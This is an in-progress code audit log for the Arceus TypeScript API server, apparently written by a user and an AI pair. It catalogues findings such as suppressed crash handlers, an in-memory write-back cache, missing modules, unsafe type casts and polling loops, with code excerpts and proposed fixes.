---
title: Arceus Code Audit — Flaws Log
started: 2026-04-19
status: in-progress
---

# Arceus Code Audit — Flaws Log

Flaws we (the user + AI pair) agree on after discussing each file. I propose, you decide — nothing lands here without your nod.

## Severity legend

| Symbol | Name | Meaning |
|---|---|---|
| ⛔ | build-breaking | codebase doesn't compile or start |
| 🔴 | critical | data loss, incident, or security breach |
| 🟠 | high | architectural debt; will keep biting until fixed |
| 🟡 | medium | friction, minor bug, code-quality |
| 🟢 | nit | style / convention |

Categories: `[build]` `[arch]` `[agent]` `[code]` `[sec]` `[perf]` `[obs]` `[test]` `[race]` `[type]`.

## Findings

### `apps/api/src/server.ts`

#### F-001 🔴 [arch][sec][obs] · Global `unhandledRejection` + `uncaughtException` handlers suppress process termination
- **Where:** `apps/api/src/server.ts:1-7`
  ```ts
  // Prevent unhandled rejections/exceptions from killing the process
  process.on("unhandledRejection", (reason) => {
    console.error("[ARCEUS] Unhandled rejection (process kept alive):", reason instanceof Error ? reason.message : reason);
  });
  process.on("uncaughtException", (err) => {
    console.error("[ARCEUS] Uncaught exception (process kept alive):", err.message, err.stack?.split("\n").slice(0, 3).join("\n"));
  });
  ```
- **Observation:** Both handlers log the error and intentionally do not exit. The comment makes the intent explicit. After `uncaughtException`, Node's own documentation states the process is in undefined state — pending microtasks, open file descriptors, half-applied side effects are all indeterminate. Continuing execution in that state is unsafe.
- **Why it matters for Arceus:**
  1. **Partial-write hazard.** A throw between a DB mutation and its paired audit emit leaves the store updated with no audit trail. Downstream beats run on top of inconsistent state.
  2. **Scheduler keeps firing.** `HeartbeatEngine` is interval-driven; a sync throw inside one tick doesn't clear the timer, so agents continue waking against a corrupted process.
  3. **Silent boot failure.** An unhandled rejection from `app.listen` (e.g. `EADDRINUSE`, permission denied) is swallowed: the process stays alive with no HTTP listener, producing a "healthy-looking" ghost whose outward signal is indistinguishable from "starting up."
  4. **Truncated forensics.** `err.stack?.split("\n").slice(0, 3).join("\n")` drops deep async chains; `reason` on the rejection path is only serialized via `.message`, losing `stack` and `cause`.
  5. **Observability bypass.** Errors never reach `audit-ledger` — post-mortems based solely on the audit trail will miss every crash.
- **Proposed fix:** route both handlers through the structured logger with full error serialization (`name`, `message`, `stack`, `cause` chain), flush the audit ledger synchronously, then `process.exit(1)`. Rely on the process supervisor (Docker, Railway, pm2, systemd) to restart. Fail loud; let the orchestration layer observe the crash signal and respond.

#### F-002 🟠 [arch][perf][test] · Full company snapshot held in-memory as a module-level singleton (write-back cache pattern)
- **Where:** `apps/api/src/persistence/store.ts` (referenced from `server.ts:12-24, 72`)
  ```ts
  import {
    getSnapshot, hydrate, flush, teardown,
    updateMeeting, upsertMeeting, upsertMeetingSchedule, updateMeetingSchedule,
    upsertTask, updateTask, upsertApproval, appendChatMessage,
  } from "./persistence/store.js";
  ...
  await hydrate();
  ```
- **Observation:** the store holds the full `CompanySnapshot` (`{ agents, tasks, sprints, meetings, ... }`) in process RAM as a module-level singleton. The persistence layer is implemented as a **write-back cache** against Postgres/Supabase:
  - `hydrate()` loads DB → RAM on boot.
  - `getSnapshot()` reads from RAM.
  - `upsert*` / `update*` helpers mutate RAM + enqueue a pending DB write.
  - `flush()` drains pending writes to the DB (called periodically and on shutdown).
  - `teardown()` performs a final flush + release.

  At rest, the DB is the source of truth; during runtime, RAM is. The two only reconcile at `hydrate()` boundaries.
- **Why it matters:**
  1. **Durability gap.** Any mutation made between two `flush()` calls is lost if the process crashes. Combined with F-001 (suppressed crash handlers), mutations can be issued into a dead process with the operator none the wiser.
  2. **Horizontal scaling blocked.** Running a second API server against the same DB produces two divergent in-memory snapshots — neither observes the other's writes until the next `hydrate()` (which only runs on boot). This eliminates the standard multi-node deployment story and any rolling-deploy strategy.
  3. **Single-writer assumption.** Any external writer to the DB (migration job, manual SQL fix, separate service, webhook handler bypassing the API, a cron) is invisible to the running process until restart.
  4. **Memory ceiling scales with tenant size.** The snapshot includes every agent, task, sprint, meeting, approval, artifact for a company. For a single small company this is fine; at 10³–10⁴ companies or a single large company with long history, the process blows its heap.
  5. **Test friction.** Tests that exercise route handlers must construct or pre-populate the snapshot by running `hydrate()` (which needs a DB) or by patching the module's internal state. Neither is isolated; both are slow.
  6. **No per-request scoping.** The snapshot is global to the process. A mutation inside one request is immediately visible to another in-flight request with no transactional boundary, producing TOCTOU-style read-modify-write races across concurrent handlers.
- **Proposed fix:** evolve in three stages as scale pressure appears.
  1. **Short-term (current scale):** accept the pattern; shrink the durability gap by making `flush()` run after every mutation that crosses a write boundary (or use a transactional outbox); add metrics for "pending writes queue depth" and "time since last flush" to make the durability gap observable.
  2. **Medium-term (multi-process, single-tenant-per-process):** move to **DB-first access** with a **per-request, short-lived snapshot** (React-style `cache()` / Next request memoization). The route handler calls `loadSnapshotForRequest(companyId, ctx)` which does one indexed DB read, scoped to the request; mutations are SQL-first with immediate commit. Kills the global singleton.
  3. **Long-term (multi-tenant, horizontal scale):** add a shared cache layer (Redis/Valkey) for hot reads; or adopt event-sourcing where the snapshot is a projection over an append-only event log with durable write offset. Only justified when the user-visible latency of option (2) is genuinely insufficient.

  The decision is strategic, not immediate — flagging here so it doesn't get locked in by further coupling to `getSnapshot()`.

#### F-003 ⛔ [build][arch] · `./workspace/manager.js` import target does not exist on `main`
- **Where:** `apps/api/src/server.ts:35`; same import also appears in `apps/api/src/orchestration/bootstrap.ts:2`, `apps/api/src/routes/{company,preview,workspace}.routes.ts`, `apps/api/src/sprints/{lifecycle,proposals,review}.ts`, `apps/api/src/tasks/mutations.ts` — 9 files total.
  ```ts
  import { workspaceManager } from "./workspace/manager.js";
  ```
- **Observation:** the target file `apps/api/src/workspace/manager.ts` does not exist in the working tree or in the committed `main` branch. `npx tsc --noEmit` in `apps/api/` fails with 49 errors, 20 of which stem from missing `./workspace/{manager,monitor,scaffold,watchdog,preview,entry-check}.js` modules. The remaining 14 stem from `@arceus/task-engine` not being resolvable by `tsc` (see F-009, separate entry). Git history (`git log --diff-filter=D -- "apps/api/src/workspace-*.ts"`) shows commit `5984bec` ("spec-14: decompose orchestrator + server into domain modules") **deleted** the pre-refactor files `workspace-manager.ts` and `workspace-scaffold.ts` at repo root but the replacement `workspace/` directory was never committed.
- **Why it matters:**
  1. **Cold build fails.** A fresh checkout cannot compile. Any CI typecheck step, Docker build, or `pnpm install && pnpm build` from scratch errors out immediately.
  2. **Hot loop is a lie.** Dev mode via `tsx`/`tsc-watch` only runs because `apps/api/dist/workspace-manager.js` was compiled from the pre-refactor source and still sits on disk. Any consumer of `workspaceManager` executes *stale* logic that references identifiers the current source tree no longer exports — silent drift between what the TS thinks is happening and what's actually running.
  3. **Cascading flaw surface.** Every `workspaceManager.*` call site in the 9 importer files is effectively unverified. Flaws there (broken method calls, wrong parameter shapes) will only surface when the missing module is restored.
  4. **Stale dist artifacts.** `apps/api/dist/workspace-{manager,scaffold}.{js,d.ts,js.map,d.ts.map}` shouldn't be in git at all (dist is a build output) and right now compound the confusion — the `.d.ts` declares a shape the source doesn't implement.
- **Proposed fix:** see `fix.md` F-003 — recover the missing `workspace/` directory, verify tsc passes, clean `dist/`, add `dist/` to `.gitignore`.

#### F-004 🟡 [code][sec] · `ARCEUS_PERSISTENCE_MODE` read in two places with no validation
- **Where:** `apps/api/src/server.ts:70-71` and `apps/api/src/persistence/company-state.ts:11` (identical boilerplate).
  ```ts
  // server.ts:70
  const persistenceMode = (process.env.ARCEUS_PERSISTENCE_MODE ?? "local").trim().toLowerCase();
  console.log(`[STARTUP] Company state persistence mode: ${persistenceMode}`);
  ```
  ```ts
  // persistence/company-state.ts:11
  const mode = (process.env.ARCEUS_PERSISTENCE_MODE ?? "local").trim().toLowerCase();
  ```
- **Observation:** the env var is read independently in two modules with copy-pasted defensive cleanup (`?? "local"`.trim().toLowerCase()). Neither site validates the value against an allowed set. A typo such as `ARCEUS_PERSISTENCE_MODE=lokal` silently becomes the literal string `"lokal"` — `server.ts` logs it verbatim, `company-state.ts` uses it in whatever branching logic it contains (likely a fall-through to the "local" default since no case matches).
- **Why it matters:**
  1. **Duplicated parsing = drift risk.** Any future change (add a mode, change normalization rules) must be applied to both sites; otherwise the two modules disagree about what "mode" means.
  2. **Silent misconfiguration.** Typos, wrong casing in an env file, or a value from a mode set that was renamed all pass through without error. The operator sees a log that says "Company state persistence mode: lokal" — indistinguishable from a real mode name at a glance.
  3. **No type-level propagation.** Downstream code that checks `if (mode === "supabase")` gets no autocomplete, no exhaustiveness check, no compile-time guarantee that all branches are handled.
  4. **Cross-cutting config scattered.** Other env-driven flags (`ARCEUS_DEMO_MODE`, Azure config, etc.) already live in `config/*.ts` with proper loader helpers. This one breaks the convention.
- **Proposed fix:** see `fix.md` F-004 — centralize read + Zod enum validation in `apps/api/src/config/persistence.ts`; replace both inline reads with the imported constant.

#### F-005 🟡 [arch][test] · Module-level import-time side effects — boot fires on `import`
- **Where:** `apps/api/src/server.ts:67-68, 72`, and the cascading `app.register(...)` + `await app.listen(...)` later in the file.
  ```ts
  // lines 67-68
  const productDir = workspaceManager.getLegacyProductDir();
  cpSetBuildCheckDir(productDir);
  // line 72
  await hydrate();
  ```
- **Observation:** `server.ts` performs three distinct side effects at module-load time, before any function boundary: (1) reads a path via a singleton getter, (2) mutates a module-level singleton in `control-plane.ts`, (3) performs a DB-connecting `await hydrate()`. Further down (§5-§6 of the file) it also runs the registry seed, auto-resumes the heartbeat scheduler, and finally binds the HTTP port. Because ESM permits top-level `await`, the file is simultaneously a valid *entry point* and an *importable module*. Anything that imports it inherits the full boot.
- **Why it matters:**
  1. **Test isolation is impossible.** A unit test for any route handler can't simply `import { someRouteHandler } from "../src/server.js"` — the test inherits a DB connection attempt, a scheduler start, a port bind.
  2. **No in-process second server.** Spinning up two Fastify instances in one process (e.g. for parallel integration tests, or an admin server on a separate port) requires replicating the entire boot sequence manually.
  3. **Failure modes get swallowed at import.** If `hydrate()` throws during a test's module load, the test runner sees an opaque "module load failed" instead of a scoped assertion.
  4. **Composition vs execution are conflated.** The file does both "wire dependencies" (composition) and "run" (execution). Industry convention is to split: the composition root is a factory (`startServer(deps) => Promise<FastifyInstance>`); a thin executable (`index.ts` or `main.ts`) calls it.
- **Proposed fix:** see `fix.md` F-005 — extract `startServer(config, services): Promise<FastifyInstance>`; make `server.ts` export the factory; add a tiny `index.ts` entrypoint.

#### F-006 🟢 [code][arch] · `getLegacyProductDir()` — deprecated-by-name API called from composition root
- **Where:** `apps/api/src/server.ts:67`.
  ```ts
  const productDir = workspaceManager.getLegacyProductDir();
  ```
- **Observation:** the method name encodes tech debt ("Legacy"), signalling that a newer API exists or is planned. The composition root — the highest-level wiring file — consumes it directly. Because of F-003 the target file isn't even present; verifying which non-legacy API exists is blocked on that fix.
- **Why it matters:**
  1. **Name encodes known debt.** A `getLegacy*()` caller is implicitly on the upgrade path that the author intended but didn't finish; every new call site added to the Legacy API lengthens the migration.
  2. **Observable only at read-time.** Unlike a runtime error, this stays dormant until someone reads the code; drive-by PRs may add more Legacy calls because the pattern is "established."
  3. **Bidirectional coupling risk.** The Legacy method likely returns the same data under a slightly different shape; dual usage risks drift between Legacy consumers and modern consumers.
- **Proposed fix:** see `fix.md` F-006 — once F-003 is resolved, identify the non-legacy getter, migrate the two callers (here + `cpSetBuildCheckDir` consumer), and delete the Legacy method. If the Legacy method is the *only* getter (name misleads), rename it.

#### F-007 🟢 [sec][obs] · Fastify default logger has no redaction paths configured
- **Where:** `apps/api/src/server.ts:66`.
  ```ts
  const app = Fastify({ logger: true });
  ```
- **Observation:** `logger: true` yields Fastify's default Pino instance with the framework's base redaction (`req.headers.authorization` and a few related) but nothing specific to Arceus's payload shapes. Any route handler that logs a request/response body containing credentials, API keys, LLM provider tokens, or MCP secrets will write them to stdout in cleartext, and from there to wherever logs are shipped.
- **Why it matters:**
  1. **Preemptive posture, not current leak.** There's no evidence today of a leaky log line; the flaw is that adding one is trivially easy because the baseline is "log everything."
  2. **Logs outlive the app.** If logs are aggregated (Datadog, Grafana Loki, CloudWatch), the retention window is measured in weeks; a single accidental payload log can linger far longer than the bug that produced it.
  3. **OWASP LLM Top 10:2025 — A06 "Sensitive Information Disclosure."** Applicable directly when the payload contains provider tokens or system-prompt-derived secrets.
  4. **Log level is inherited default, too.** `logger: true` also means `info` level in all environments — overly verbose in prod, under-verbose in dev.
- **Proposed fix:** see `fix.md` F-007 — replace with a structured config specifying redaction paths, level by environment, and transport.

#### F-008 🟢 [code] · Import block has no grouping, ordering, or barrel hygiene
- **Where:** `apps/api/src/server.ts:9-62`.
- **Observation:** 26 statements spanning external packages (`fastify`, `@fastify/cors`), relative paths (`./persistence/store.js`, `./persistence/control-plane.js`, etc.), and workspace packages (`@arceus/company-runtime`). They are interleaved with no alphabetical or architectural grouping. The largest barrel — 12 named imports from `./persistence/store.js` — foreshadows a god-module in that file (to be audited separately).
- **Why it matters:**
  1. **Signal-to-noise on diffs.** Adding an import requires scanning the full block to decide where it belongs; reviewers can't easily tell what layer a new dependency introduces.
  2. **No automatic ordering = noise on merges.** Conflict resolution on the import block is manual; different contributors put imports in different spots.
  3. **Hides architectural coupling.** When imports are sorted by source (external / workspace / relative / side-effect), the file's dependency surface becomes visually obvious; without it, "this file reaches into 6 subsystems" is hidden.
- **Proposed fix:** see `fix.md` F-008 — enable `import/order` rule with explicit groups; `knip` + `@typescript-eslint/consistent-type-imports` as companions.

#### F-009 🟠 [type][arch] · `applyMutations` forced through `as any` at the DI boundary
- **Where:** `apps/api/src/server.ts:81`
  ```ts
  applyMutations: (companyId, mutations, causation, expectedVersion) =>
    cpApplyMutations(companyId, mutations as any, causation, expectedVersion),
  ```
- **Observation:** the runtime interface (`packages/company-runtime/src/heartbeat.ts:66-71`) types mutations loosely as `Array<{ type: string; [key: string]: unknown }>`. The Arceus implementation `cpApplyMutations` expects a strict discriminated union (`TaskMutation | MemoryMutation | SprintMutation | …`). The `as any` cast silences the mismatch at the DI boundary. Two defects are stacked:
  1. **Runtime interface is too permissive** — it should be `BeatDependencies<TMutation>` so the host pins the narrow union.
  2. **Server-side cast erases whatever safety remained** — if the runtime emits a mutation with a `type` the host doesn't recognize, no compile error; it falls through to an "unknown mutation" path at runtime (silent no-op or throw, depending on `cpApplyMutations` internals).
- **Why it matters:**
  1. **Unknown-mutation regressions go undetected.** Adding a new mutation kind to the runtime without updating the host is a one-line runtime-package change that compiles cleanly on both sides.
  2. **IDE/refactor safety lost.** Renaming a mutation discriminant on the host side doesn't propagate back into the runtime's usages; the cast hides the drift.
  3. **CI typecheck cannot catch this regression.** The cast is the official blessing.
- **Proposed fix:** see `fix.md` F-009 — parameterize `BeatDependencies` on `TMutation`; delete the cast at the call site.

#### F-010 🟠 [arch][test] · `beatDeps` factory inlined in the composition root (25-line object literal)
- **Where:** `apps/api/src/server.ts:76-100`
- **Observation:** the composition root constructs a 12-method `BeatDependencies` object inline. The methods close over: `cpLoadAgentContext`, `cpGetSnapshotVersion`, `cpApplyMutations`, `cpCommitBeatRecord`, `flush`, `audit`, `executeBeatTask`, `executeChecklistAction`, `getSnapshot`, `emitBeatEvent`. Each is a thin wrapper with some inline shaping (audit categories, the `"company_pending"` roster guard, the `mutations as any` cast). The file's role is "wire dependencies"; constructing the adapter object is separate work.
- **Why it matters:**
  1. **Test isolation blocked.** A test that wants to exercise `HeartbeatEngine` with real audit + mocked task execution (or any other partial swap) has to replicate all 25 lines plus the closure captures. There is no way to call `buildBeatDependencies({ auditor, ... })` with a partial override because the helper doesn't exist.
  2. **File grows per dependency.** Each new port added to the runtime interface enlarges server.ts without improving its wiring role.
  3. **Composition vs construction conflated.** Same anti-pattern as F-005 (top-level side effects) at a smaller scale — the file is mixing "here is how dependencies are assembled" with "here is the boot sequence."
  4. **Couples server.ts to audit-ledger categories, sentinel strings, and roster-projection logic** — all of which belong in domain modules.
- **Proposed fix:** see `fix.md` F-010 — extract `buildBeatDependencies(services): BeatDependencies` to `apps/api/src/heartbeats/beat-deps.ts`; accept a `services` object so tests can spread overrides.

#### F-011 🟡 [obs][code] · `auditError` discards stack, cause chain, and error class
- **Where:** `apps/api/src/server.ts:89-90`
  ```ts
  auditError: (companyId, eventType, summary, error, opts) =>
    audit({ companyId, category: "error", severity: "error", eventType, summary,
            detail: { error: error instanceof Error ? error.message : error }, ...opts }),
  ```
- **Observation:** the runtime hands us the raw `unknown` error. The wrapper collapses it to `.message`, dropping:
  - `Error.name` (e.g. `TypeError`, `ZodError`, `PostgresError`)
  - `Error.stack` (file + line + call-site chain)
  - `Error.cause` (the `{ cause }` chain introduced in ES2022; critical for wrapped errors).
  Non-Error values are stored as-is — meaning if the runtime ever throws a plain object, we store that object verbatim; if it throws a number, we store the number. Inconsistent shape in the audit record.
- **Why it matters:**
  1. **Post-mortem forensics gone.** An audit entry three weeks old reading `{ summary: "beat execution failed", detail: { error: "something broke" } }` gives no path back to the originating site.
  2. **Compound with F-001.** If we ship F-001's `serializeError` at the process-handler level, the top-level crash path gets full fidelity — but every deliberate audit of a caught-and-handled error (the common case) still truncates. Asymmetry.
  3. **Audit ledger's reason for existing.** The ledger is meant to be the durable backstop when application logs roll over; truncation defeats the reason.
  4. **Shape inconsistency across entries.** Some `error` details will be strings, others objects, others numbers — makes downstream analysis (alerting, dashboards) brittle.
- **Proposed fix:** see `fix.md` F-011 — use a `serializeError(err)` helper that captures `name`, `message`, `stack`, and recursively the `cause` chain; fall back to `{ value: String(err) }` for non-Error values. Same helper can be reused by F-001.

#### F-012 🟡 [code][arch] · `"company_pending"` magic string used as no-company sentinel
- **Where:** `apps/api/src/server.ts:96` (inside `getAgentRoster`) and `:288` (inside the auto-resume block). Likely other call sites — `git grep -n "company_pending"` will enumerate.
  ```ts
  if (snap.company.id === "company_pending") return [];
  ```
- **Observation:** the literal string `"company_pending"` represents the "no company has been set up yet" state. It is compared by equality across the codebase with no named constant, no type-level branding, and no structural representation.
- **Why it matters:**
  1. **Typo risk.** Any divergence — `"Company_Pending"`, trailing whitespace, `"pending"`, `"companypending"` — fails silently (check evaluates false; code enters the *other* branch).
  2. **Rename risk.** Changing the sentinel requires updating every comparison across the codebase — with no compile help.
  3. **Type system can't help.** `snap.company.id` is typed as `string`; the compiler cannot warn about misspellings or missing handlers.
  4. **Models "absence" as "a specific presence."** Semantically the pre-setup state is "no company exists yet"; conflating that with an ID is a type-smell. A discriminated union (`{ state: "pending" } | { state: "hired"; company: Company; agents: Agent[] }`) encodes the truth and forces exhaustive narrowing at every consumer.
- **Proposed fix:** see `fix.md` F-012 — quick win: export `COMPANY_ID_PENDING = "company_pending" as const` from `packages/contracts/src/company.ts`; structural win: refactor `CompanySnapshot` into a discriminated union over `state`.

#### F-013 🟠 [arch][test] · Module-level setter DI for `reactiveEventEmitter` — process-wide singleton
- **Where:** `apps/api/src/server.ts:105-107` (the setter call), plus `apps/api/src/orchestration/state.ts:138-140` (the slot):
  ```ts
  // state.ts
  let reactiveEventEmitter: ((...) => void) | null = null;
  export function setReactiveEventEmitter(fn: typeof reactiveEventEmitter) { reactiveEventEmitter = fn; }
  export function getReactiveEventEmitter() { return reactiveEventEmitter; }
  ```
- **Observation:** the reactive emitter lives in a module-level `let` slot. server.ts mutates the slot on boot. Consumers call `getReactiveEventEmitter()` and null-check.
- **Why it matters:**
  1. **Only one slot per process.** Running two Fastify instances in one process (integration tests, a second admin server, parallel test workers without process isolation) is impossible — they stomp on each other.
  2. **Test pollution.** State leaks across tests unless each test explicitly calls a reset. No reset function exists today; tests that set the emitter leave it live for the next test.
  3. **Order-sensitive boot.** Any caller that reaches `state.ts` before server.ts has run `setReactiveEventEmitter(...)` gets `null`. The compile-time type forces a null-check at every call site (we have `getReactiveEventEmitter()` returning `... | null`). Defensive null-checks proliferate.
  4. **Inconsistent DI style.** The `HeartbeatEngine` gets proper constructor injection (`new HeartbeatEngine(config, deps)`). The reactive emitter gets a setter. Same concern, two mechanisms, in the same file.
  5. **Coupling to `MeetingScheduler` via the same pattern** at `state.ts:142-145` (`setMeetingScheduler` / `getMeetingSchedulerRef`). The flaw is a pattern, not a one-off.
- **Proposed fix:** see `fix.md` F-013 — delete the module-level `let` and the setters; pass the emitter and scheduler as explicit parameters to the modules that need them, sourced from the `startServer(opts)` factory (F-005). Where absolutely required, scope the state in a class or a per-server context object.

#### F-014 🟢 [code] · Three audit wrappers differ only by a category constant
- **Where:** `apps/api/src/server.ts:84-91`
  ```ts
  audit: {
    auditAgent: (companyId, agentRole, eventType, summary, opts) =>
      audit({ companyId, category: "agent_action", eventType, summary, agentRole, ...opts }),
    auditSystem: (companyId, eventType, summary, opts) =>
      audit({ companyId, category: "system", eventType, summary, ...opts }),
    auditError: (companyId, eventType, summary, error, opts) =>
      audit({ companyId, category: "error", severity: "error", eventType, summary, detail: { error: ... }, ...opts }),
  },
  ```
- **Observation:** three methods, near-identical bodies, differ only in the baked-in `category` (and one `severity` pin for errors). The shape is mandated by the runtime interface (`BeatDependencies.audit.{auditAgent,auditSystem,auditError}`), so collapsing on the host side alone is not possible.
- **Why it matters:** marginal code duplication; fix lives in the runtime package, not in server.ts. Flagged only because touching `BeatDependencies` for F-009 is an opportunity to collapse all of it at once.
- **Proposed fix:** see `fix.md` F-014 — when F-009 revises `BeatDependencies`, simultaneously collapse `audit` into a single `audit(entry)` method and let the host wrap at the call site.

#### F-015 🟠 [arch][test] · `MeetingPipeline` inline construction is 157 lines of phase logic in the composition root
- **Where:** `apps/api/src/server.ts:111-267`.
- **Observation:** `new MeetingPipeline({ ... })` is called inline with a literal object containing 3 store handles, 2 token-tracking thunks, and **7 async phase callbacks** totalling ~155 lines. The callbacks own real business logic: the polling loop in `collectContributions` (26 lines), the full `extractMemories` pipeline (55 lines including a Zod schema and an LLM-invocation closure), the regex-parsing escalation router. server.ts's role is composition; the pipeline itself is a domain.
- **Why it matters:**
  1. **Tests cannot exercise one phase in isolation.** Every integration test that touches the pipeline inherits the full 155-line wiring.
  2. **Phase logic is wedged inside a factory literal.** Static analysis (find-references, rename-refactor) works poorly on anonymous methods inside object literals.
  3. **Pattern replicates F-010 at 6× scale.** Same failure mode (composition vs construction conflated), larger footprint.
  4. **File grows per phase.** Any new meeting phase lengthens server.ts.
  5. **Hides a circular dep.** All 5 dynamic imports (F-016) live inside this construction; pulling them out would reveal the import cycle.
- **Proposed fix:** see `fix.md` F-015 — extract `buildMeetingPipeline(services): MeetingPipeline` into `apps/api/src/meetings/pipeline.ts`; each phase callback becomes a named exported function in `meetings/phases/*.ts`; server.ts shrinks to one call.

#### F-016 🟡 [arch][code] · Five dynamic `await import(...)` statements inside pipeline callbacks
- **Where:** `apps/api/src/server.ts:151, 162, 173, 182, 194-198`.
  ```ts
  async synthesizeMeeting(meeting) {
    const { synthesizeMeeting: synthesize } = await import("./meetings/synthesis.js");
    ...
  }
  async extractMemories(meeting) {
    const { extractMeetingMemories } = await import("@arceus/company-runtime");
    const { MEETING_EXTRACTION_PROMPT, buildMeetingExtractionPrompt } = await import("@arceus/hippocampus");
    const { structuredCompletion } = await import("./infra/azure-openai.js");
    const { z } = await import("zod");
    const { hippocampus } = await import("./memory/extractors.js");
    ...
  }
  ```
- **Observation:** 6 of 7 callback bodies open with one or more dynamic imports. `extractMemories` alone does 5. Node's module cache makes subsequent calls cheap, but the pattern still costs: deps are invisible to static-analysis tools (`knip`, bundler tree-shakers, IDE "find usages"); cognitive load on every read; a ceremony before any real work starts.
- **Why it matters:**
  1. **Circular dependency is masked, not fixed.** Dynamic imports delay resolution past module-load; the cycle still exists in the dep graph.
  2. **Dead-code scanners can't trace these edges.** `knip` reports imports from these modules as unused.
  3. **`import/no-cycle` lint rule, if added, would be silent about these.** Dynamic imports bypass the rule.
  4. **Proliferation risk.** Once the pattern is established, every new module that causes a cycle gets papered over with `await import` instead of architectural cleanup.
  5. **Zod imported dynamically at `server.ts:197`** is especially suspicious — Zod is used elsewhere at top-level; pulling it dynamically here serves no purpose.
- **Proposed fix:** see `fix.md` F-016 — run `madge --circular apps/api/src` to find the cycle; break it by extracting the shared type to a third module; convert to top-of-file imports; enable `eslint-plugin-import/no-cycle` to prevent regression.

#### F-017 🟠 [perf][arch] · Five-minute busy-wait polling loop in `collectContributions`
- **Where:** `apps/api/src/server.ts:121-147`.
  ```ts
  async collectContributions(meeting) {
    const collectionTimeoutMs = 300_000;
    const pollIntervalMs = 5_000;
    const deadline = Date.now() + collectionTimeoutMs;

    // emit events to participants
    for (const agentId of meeting.participantAgentIds) { ... }

    while (Date.now() < deadline) {
      const current = getSnapshot().meetings.find((m) => m.id === meeting.id);
      if (!current || current.status !== "collecting") break;
      if (current.contributions.length >= meeting.participantAgentIds.length) break;
      await new Promise((r) => setTimeout(r, pollIntervalMs));
    }
    return getSnapshot().meetings.find((m) => m.id === meeting.id) ?? meeting;
  }
  ```
- **Observation:** after emitting contribution-request events to each participant, the callback polls the snapshot every 5s for up to 5 minutes waiting for all participants to reply. Each iteration does `getSnapshot().meetings.find(...)` — a linear scan. Worst case: 60 iterations, 60 snapshot scans, and a worker pinned to the setTimeout chain for 5 minutes.
- **Why it matters:**
  1. **Worker-thread pinning.** The async operation occupies a worker slot for the entire wait. With 10 concurrent meetings collecting, 10 workers sit idle in poll loops.
  2. **Stale by up to 5 seconds.** Even if the last participant contributes at t=2s, we sleep until the next tick.
  3. **Linear scans on every iteration.** As `meetings.length` grows, the cost per iteration grows with it.
  4. **Zero backpressure awareness.** The loop doesn't care if the process is under load, shutting down, or cancelled.
  5. **No early-exit path from outside.** Cannot interrupt from a route handler, graceful-shutdown handler, or board operator.
- **Proposed fix:** see `fix.md` F-017 — replace with event-driven wait on a `meeting_contribution_added` event emitter; `Promise.race([allContributionsPromise, timeoutPromise, abortPromise])`.

#### F-018 🟡 [code] · Hardcoded poll timing magic numbers in `collectContributions`
- **Where:** `apps/api/src/server.ts:123-124` — `300_000` (timeout), `5_000` (poll interval).
- **Observation:** bare numeric literals with inline comments translating them (`// 5 minutes`). No env override; no config file; no type safety.
- **Why it matters:** tuning requires source edit + deploy; different environments (dev, staging, prod) can't have different values; no single place to audit "what are all the meeting-related timeouts?"
- **Proposed fix:** see `fix.md` F-018 — `config/meetings.ts` exports `contributionTimeoutMs` and (until F-017 lands) `contributionPollIntervalMs`.

#### F-019 🟡 [arch][reliability] · `collectContributions` accepts no `AbortSignal`
- **Where:** `apps/api/src/server.ts:121-147`.
- **Observation:** the callback has no cancellation token. Once entered, it runs until timeout or successful completion. Graceful shutdown, meeting cancellation, and company-pause all have to wait for it to finish.
- **Why it matters:**
  1. **Graceful shutdown hangs.** A SIGTERM while a meeting is collecting blocks up to 5 minutes before `app.close()` resolves.
  2. **Cancelled meetings still wait.** If the meeting transitions out of `"collecting"` externally, the loop notices *eventually* (via the `status !== "collecting"` check), but only on the next tick — up to 5s late.
  3. **Resource leak during tests.** Tests that fail or time out leave pipelines still running in the background.
- **Proposed fix:** see `fix.md` F-019 — thread an `AbortSignal` from the pipeline runner (sourced from shutdown or route-handler) through each callback; check it on every iteration; throw `AbortError` cleanly.

#### F-020 🟠 [arch][data-model] · Related task ID regex-parsed from meeting title
- **Where:** `apps/api/src/server.ts:249-251`.
  ```ts
  const taskIdMatch = meeting.title.match(/\[([^\]]+)\]$/);
  const relatedTaskId = taskIdMatch?.[1] ?? null;
  ```
- **Observation:** `onEscalationComplete` extracts the related task ID by pattern-matching on the human-readable meeting title. Titles follow a convention like `"Escalation: CEO stalled [tsk_abc123]"`.
- **Why it matters:**
  1. **Display string is load-bearing.** A title edit (by a board operator, a translator, a product rename) silently breaks escalation routing.
  2. **No referential integrity.** A title can reference a task that doesn't exist; the system has no way to enforce it.
  3. **Query surface crippled.** "All meetings about task X" requires a regex over every title in the DB. With a proper FK you'd have an index.
  4. **Brittle across any title-format change.** If product decides titles should be sentence-case, or uses a different delimiter, or drops the ID from the display, escalation silently stops firing.
  5. **Confuses two concerns.** The title is for humans; the link is for code. They should live in different fields.
- **Proposed fix:** see `fix.md` F-020 — add `relatedTaskId: string | null` to the `Meeting` contract; populate at creation; migrate existing meetings once via regex backfill, then delete the regex.

#### F-021 🟡 [obs][code] · Failed memory stores silently swallowed in `extractMemories` loop
- **Where:** `apps/api/src/server.ts:237-242`.
  ```ts
  for (const { memories } of results) {
    try {
      totalStored += await hippocampus.storeMemories(memories);
    } catch (err) {
      console.warn(`[MEETING-MEMORY] Failed to store memories: ${err instanceof Error ? err.message : err}`);
    }
  }
  ```
- **Observation:** per-participant memory storage failures are caught, logged to stderr, and discarded. No audit, no tracking of which participant failed, no record of the expected vs actual count.
- **Why it matters:**
  1. **Silent data loss.** An agent's memory tier gets a hole, no system-level visibility.
  2. **Triple loss.** Participant ID, full error (only `.message`), and expected-vs-stored count all dropped.
  3. **Ledger-blind.** The audit ledger is supposed to be the durable record; this path bypasses it entirely.
  4. **Loop-wide coupling.** One slow storage failure can compound — if hippocampus is down, we silently fail for every participant.
- **Proposed fix:** see `fix.md` F-021 — wrap each iteration in `auditError` (using F-011's `serializeError`); include participant ID, attempt count, and stored count; consider whether partial failure should degrade the whole phase.

#### F-022 🟡 [obs][arch] · No audit emit on meeting pipeline phase transitions
- **Where:** all 7 callbacks in `apps/api/src/server.ts:111-267`.
- **Observation:** the pipeline transitions across 6 phases (collect, synthesize, resolve, execute, brief, extract) plus escalation completion. None of them audit. The audit ledger has no record of meeting progress — only the beat-event-bus gets per-phase signals, and those aren't durable.
- **Why it matters:**
  1. **Post-mortem impossible.** "The Tuesday daily sync took 7 minutes — which phase was slow?" No data.
  2. **Failed meetings don't leave a trail.** If synthesize throws, there's no durable "synthesize_failed" entry.
  3. **Alerting blocked.** Can't alert on "synthesize phase p95 latency > 60s" without time-series data from audit.
